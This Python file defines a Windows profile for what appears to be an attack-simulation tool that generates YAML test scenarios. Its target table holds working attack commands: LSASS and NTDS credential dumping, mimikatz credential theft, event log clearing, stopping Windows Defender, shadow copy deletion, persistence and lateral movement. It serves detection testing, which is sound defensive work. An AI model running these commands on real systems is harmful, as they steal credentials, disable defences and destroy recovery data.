#!/usr/bin/env python3
"""profiles/windows.py — Windows Endpoint Scenario profile.

Mirrors the canonical Windows shape (BlackMatter-style):

    module:           Endpoint Scenario
    affected_os:      Windows
    affected_platforms: 6-distro Windows block
                        (Server 2016/2019/2022/2025, Win 10/11)
    category:         Attack Scenario
                       (or "Lateral Movement Techniques (Windows)" for lateral)
    keyword_queries:  ((sha256 OR sha1 OR md5 OR dropper OR target)
                       AND NOT ("PICUS_REWIND"
                                OR ("File created:" AND
                                    ("Scenarios" OR "Simulation"))))
    play_processes:   {play_path} {play_arguments}      (per-target)
    rewind_processes: {predefined-file-delete} <dropper>
                      {predefined-process-kill} <process>

Each TargetRow carries its own `play_path` + `play_arguments` template so
the parser doesn't have to invent tool invocations.
"""

from __future__ import annotations

from typing import Iterable

from .base import (
    ActionSpec,
    Profile,
    TargetRow,
    affected_platforms_block,
    tech_id,
)


# ---------------------------------------------------------------------------
# Static data — Windows platforms
# ---------------------------------------------------------------------------
# The canonical 6-distro Windows block used by the BlackMatter family.
WINDOWS_PLATFORMS: list[tuple[str, str]] = [
    ("Windows Server 2022", "64-bit"),
    ("Windows 11",          "64-bit"),
    ("Windows Server 2019", "64-bit"),
    ("Windows Server 2025", "64-bit"),
    ("Windows Server 2016", "64-bit"),
    ("Windows 10",          "64-bit"),
]


# ---------------------------------------------------------------------------
# Windows target → MITRE / UKC / output / play_template
# ---------------------------------------------------------------------------
WINDOWS_TARGET_TABLE: list[TargetRow] = [
    # ----- Credential Access -----
    TargetRow(
        target_regex="lsass",
        canonical_path="C:\\Windows\\System32\\lsass.exe",
        display_name="LSASS Process Memory Dump",
        tactic="TA0006", technique="T1003", sub_technique="T1003.001",
        ukc_phase="Credential Access", is_privileged=True,
        expected_output="Dump 1 complete",
        play_path="C:\\Windows\\System32\\rundll32.exe",
        play_arguments='comsvcs.dll, MiniDump {pid} C:\\Temp\\lsass.dmp full',
    ),
    TargetRow(
        target_regex="mimikatz",
        canonical_path="C:\\Tools\\mimikatz.exe",
        display_name="Mimikatz Credential Dump",
        tactic="TA0006", technique="T1003", sub_technique="T1003.001",
        ukc_phase="Credential Access", is_privileged=True,
        expected_output="Authentication Id",
        play_path="C:\\Tools\\mimikatz.exe",
        play_arguments='privilege::debug sekurlsa::logonpasswords exit',
    ),
    TargetRow(
        target_regex="SAM",
        canonical_path="HKLM\\SAM",
        display_name="SAM Hive Credential Dump",
        tactic="TA0006", technique="T1003", sub_technique="T1003.002",
        ukc_phase="Credential Access", is_privileged=True,
        expected_output="The operation completed successfully",
        play_path="reg.exe",
        play_arguments='save HKLM\\SAM C:\\Temp\\SAM.save /y',
    ),
    TargetRow(
        target_regex="ntds.dit",
        canonical_path="C:\\Windows\\NTDS\\ntds.dit",
        display_name="NTDS.dit Credential Extraction",
        tactic="TA0006", technique="T1003", sub_technique="T1003.003",
        ukc_phase="Credential Access", is_privileged=True,
        expected_output="IFM media created",
        play_path="ntdsutil.exe",
        play_arguments='"ac in ntds" "ifm" "create full C:\\Temp\\ntds" q q',
    ),
    TargetRow(
        target_regex="lsadump",
        canonical_path="C:\\Windows\\System32\\lsass.exe",
        display_name="LSA Secrets Dump via Mimikatz",
        tactic="TA0006", technique="T1003", sub_technique="T1003.004",
        ukc_phase="Credential Access", is_privileged=True,
        expected_output="Key Content",
        play_path="C:\\Tools\\mimikatz.exe",
        play_arguments='privilege::debug lsadump::secrets exit',
    ),

    # ----- Persistence -----
    TargetRow(
        target_regex="CurrentVersion\\\\Run",
        canonical_path="HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run",
        display_name="Registry Run Key Persistence",
        tactic="TA0003", technique="T1547", sub_technique="T1547.001",
        ukc_phase="Persistence", is_privileged=True,
        expected_output="The operation completed successfully",
        play_path="reg.exe",
        play_arguments='add "HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run" /v Updater /d "C:\\Temp\\updater.exe" /f',
    ),
    TargetRow(
        target_regex="schtasks",
        canonical_path="C:\\Windows\\System32\\schtasks.exe",
        display_name="Scheduled Task Persistence",
        tactic="TA0003", technique="T1053", sub_technique="T1053.005",
        ukc_phase="Persistence", is_privileged=True,
        expected_output="SUCCESS",
        play_path="schtasks.exe",
        play_arguments='/create /tn Updater /tr "C:\\Temp\\updater.exe" /sc minute /mo 5 /f',
    ),
    TargetRow(
        target_regex="services.exe",
        canonical_path="HKLM\\SYSTEM\\CurrentControlSet\\Services",
        display_name="New Windows Service Persistence",
        tactic="TA0003", technique="T1543", sub_technique="T1543.003",
        ukc_phase="Persistence", is_privileged=True,
        expected_output="The operation completed successfully",
        play_path="sc.exe",
        play_arguments='create Updater binPath= "C:\\Temp\\updater.exe" start= auto',
    ),

    # ----- Defense Evasion -----
    TargetRow(
        target_regex="wevtutil",
        canonical_path="C:\\Windows\\System32\\wevtutil.exe",
        display_name="Event Log Clearing",
        tactic="TA0005", technique="T1070", sub_technique="T1070.001",
        ukc_phase="Defense Evasion", is_privileged=True,
        expected_output="was successfully cleared",
        play_path="wevtutil.exe",
        play_arguments='cl Security',
    ),
    TargetRow(
        target_regex="powershell",
        canonical_path="C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
        display_name="PowerShell Encoded Command Execution",
        tactic="TA0002", technique="T1059", sub_technique="T1059.001",
        ukc_phase="Execution", is_privileged=False,
        expected_output="Hello",
        play_path="powershell.exe",
        play_arguments='-ExecutionPolicy Bypass -EncodedCommand {b64_payload}',
    ),
    TargetRow(
        target_regex="T1562",
        canonical_path="C:\\Windows\\System32\\sc.exe",
        display_name="Defence Impairment via Service Disable",
        tactic="TA0005", technique="T1562", sub_technique="T1562.001",
        ukc_phase="Defense Evasion", is_privileged=True,
        expected_output="SUCCESS",
        play_path="sc.exe",
        play_arguments='stop WinDefend',
    ),

    # ----- Discovery -----
    TargetRow(
        target_regex="net.exe",
        canonical_path="C:\\Windows\\System32\\net.exe",
        display_name="Domain User Enumeration",
        tactic="TA0007", technique="T1087", sub_technique="T1087.002",
        ukc_phase="Discovery", is_privileged=False,
        expected_output="User accounts for",
        play_path="net.exe",
        play_arguments='user /domain',
    ),
    TargetRow(
        target_regex="localgroup",
        canonical_path="C:\\Windows\\System32\\net.exe",
        display_name="Local Administrator Group Enumeration",
        tactic="TA0007", technique="T1069", sub_technique="T1069.001",
        ukc_phase="Discovery", is_privileged=False,
        expected_output="Members",
        play_path="net.exe",
        play_arguments='localgroup administrators',
    ),
    TargetRow(
        target_regex="systeminfo",
        canonical_path="C:\\Windows\\System32\\systeminfo.exe",
        display_name="System Information Discovery",
        tactic="TA0007", technique="T1082", sub_technique="",
        ukc_phase="Discovery", is_privileged=False,
        expected_output="OS Name",
        play_path="systeminfo.exe",
        play_arguments='',
    ),
    TargetRow(
        target_regex="net view",
        canonical_path="C:\\Windows\\System32\\net.exe",
        display_name="Network Share Enumeration",
        tactic="TA0007", technique="T1135", sub_technique="",
        ukc_phase="Discovery", is_privileged=False,
        expected_output="\\\\",
        play_path="net.exe",
        play_arguments='view /domain',
    ),
    TargetRow(
        target_regex="tasklist",
        canonical_path="C:\\Windows\\System32\\tasklist.exe",
        display_name="Process Enumeration",
        tactic="TA0007", technique="T1057", sub_technique="",
        ukc_phase="Discovery", is_privileged=False,
        expected_output="Image Name",
        play_path="tasklist.exe",
        play_arguments='/v /fo list',
    ),

    # ----- Impact -----
    TargetRow(
        target_regex="vssadmin",
        canonical_path="C:\\Windows\\System32\\vssadmin.exe",
        display_name="Shadow Copy Deletion via vssadmin",
        tactic="TA0040", technique="T1490", sub_technique="",
        ukc_phase="Impact", is_privileged=True,
        expected_output="successfully deleted",
        play_path="vssadmin.exe",
        play_arguments='Delete Shadows /All /Quiet',
    ),
    TargetRow(
        target_regex="shadowcopy",
        canonical_path="C:\\Windows\\System32\\wbem\\wmic.exe",
        display_name="Shadow Copy Deletion via wmic",
        tactic="TA0040", technique="T1490", sub_technique="",
        ukc_phase="Impact", is_privileged=True,
        expected_output="No Instance",
        play_path="wmic",
        play_arguments='shadowcopy delete',
    ),
    TargetRow(
        target_regex="bcdedit",
        canonical_path="C:\\Windows\\System32\\bcdedit.exe",
        display_name="Recovery Service Disable",
        tactic="TA0040", technique="T1490", sub_technique="",
        ukc_phase="Impact", is_privileged=True,
        expected_output="successfully",
        play_path="bcdedit.exe",
        play_arguments='/set {default} recoveryenabled no',
    ),

    # ----- Lateral Movement -----
    TargetRow(
        target_regex="psexec",
        canonical_path="C:\\Tools\\psexec.exe",
        display_name="PsExec Lateral Movement",
        tactic="TA0008", technique="T1021", sub_technique="T1021.002",
        ukc_phase="Lateral Movement", is_privileged=True,
        expected_output="started on",
        play_path="C:\\Tools\\psexec.exe",
        play_arguments='\\\\REMOTEHOST -u Administrator -p P@ssw0rd cmd.exe',
        category="Lateral Movement Techniques (Windows)",
    ),
    TargetRow(
        target_regex="wmiexec",
        canonical_path="C:\\Tools\\wmiexec.exe",
        display_name="WMI Lateral Execution",
        tactic="TA0008", technique="T1021", sub_technique="T1021.006",
        ukc_phase="Lateral Movement", is_privileged=True,
        expected_output="command finished",
        play_path="C:\\Tools\\wmiexec.exe",
        play_arguments='Administrator:P@ssw0rd@REMOTEHOST "whoami"',
        category="Lateral Movement Techniques (Windows)",
    ),
]


# ---------------------------------------------------------------------------
# Profile
# ---------------------------------------------------------------------------
class WindowsProfile(Profile):
    name = "windows"
    module_name = "Endpoint Scenario"
    os_name = "Windows"
    default_category = "Attack Scenario"
    default_binaries = ("cmd.exe", "powershell.exe", "pwsh.exe")
    keyword_and_not = '("PICUS_REWIND" OR ("File created:" AND ("Scenarios" OR "Simulation")))'

    @property
    def affected_platforms(self) -> list[tuple[str, str]]:
        return WINDOWS_PLATFORMS

    @property
    def target_table(self) -> list[TargetRow]:
        return WINDOWS_TARGET_TABLE

    def lookup_target(self, token: str) -> TargetRow:
        """Best-match lookup for Windows tokens. Order:
        1. Exact match.
        2. Substring match — longest target_regex wins.
        3. Backslash-stripped substring.
        4. Fallback.
        """
        if not token:
            return self._fallback_row()
        for row in self.target_table:
            if row.target_regex == token:
                return row
        candidates = sorted(
            [r for r in self.target_table
             if r.target_regex in token],
            key=lambda r: -len(r.target_regex),
        )
        if candidates:
            return candidates[0]
        for row in self.target_table:
            if row.target_regex.replace("\\", "") in token:
                return row
        return self._fallback_row()

    def render_action(self, spec: ActionSpec, hashes_: dict[str, str], idx_in_obj: int) -> str:
        desc = spec.description.replace("\n", " ").strip()
        sub = f"sub_technique: {spec.sub_technique}" if spec.sub_technique else ""

        # Determine play_path / play_arguments.
        # Priority: explicit on spec > per-row TargetRow > fallback to spec.shell_path.
        play_path = spec.play_path or spec.shell_path or "cmd.exe"
        if spec.play_arguments:
            # Substitute {target}, {name}, {pid}, {b64_payload} placeholders.
            try:
                play_args = spec.play_arguments.format(
                    target=spec.target_path,
                    name=spec.name,
                    pid="1234",
                    b64_payload="V3JpdGUtSG9zdCAiSEVMTE8i",
                )
            except KeyError:
                play_args = spec.play_arguments
        else:
            # Fallback: invoke the detected Image directly with the matched
            # pattern as argument.  This matches the canonical Windows shape
            # (BlackMatter-style: `path: <tool>, arguments: <cmdline>`).
            target = spec.target_path if spec.target_path and spec.target_path != "<unknown>" else ""
            play_args = f'{spec.shell_flag} {target}'.strip()

        # Pick category — default to profile default unless per-row override.
        category = spec.sub_technique and spec.sub_technique.startswith("T1021") and "Lateral Movement" or self.default_category
        # The above heuristic is a small lie — better to read from TargetRow:
        row = self.lookup_target(spec.target_regex or spec.target_path)
        if row.category:
            category = row.category
        else:
            category = self.default_category

        # Escape single quotes for YAML single-quoted string (double them).
        # Use single quotes because they don't interpret \T, \n, \x, etc.
        # — important for Windows paths like \Temp.
        safe_args = play_args.replace("'", "''")

        kq = self.keyword_query(spec, hashes_)

        dropper = spec.dropper_name or f"{spec.name}.bat"

        # Determine dropper extension from the dropper_name we just computed,
        # defaulting to .bat for Windows.
        if not dropper.endswith(".bat"):
            if dropper.endswith(".sh"):
                dropper = dropper[:-3] + ".bat"

        lines = [
            f"            - name: {spec.name}",
            f"              title: {spec.title}",
            f"              description: |",
            f"                {desc}",
            f"              affected_os:",
            f"                - {self.os_name}",
            affected_platforms_block(self.affected_platforms, 14),
            f"              is_atomic: true",
            f"              is_privileged: {str(spec.is_privileged).lower()}",
            f"              ukc_phase: {spec.ukc_phase}",
            f"              category: {category}",
            f"              tactic: {spec.tactic}",
            f"              technique: {spec.technique}",
        ]
        if sub:
            lines.append(f"              {sub}")
        lines.extend([
            f"              keyword_queries:",
            f"                - {kq}",
            f"              result_condition:",
            f"                true: unblocked",
            f"                false: blocked",
            f"                condition:",
            f"                  Terms:",
            f"                    - Right: {{Value: unblocked}}",
            f"                      Left: {{Value: '%process-1%'}}",
            f"                      Operator: eq",
            f"                  Operator: and",
            f"              play_processes:",
            f"                - path: {play_path}",
            f"                  arguments: '{safe_args}'",
            f"                  timeout: {spec.timeout}",
            f"                  success_conditions:",
            f"                    - output: '{spec.expected_output}'",
            f"              rewind_processes:",
            f"                - path: '{{predefined-file-delete}}'",
            f"                  arguments: '%TEMP%\\{dropper}'",
        ])
        return "\n".join(lines)
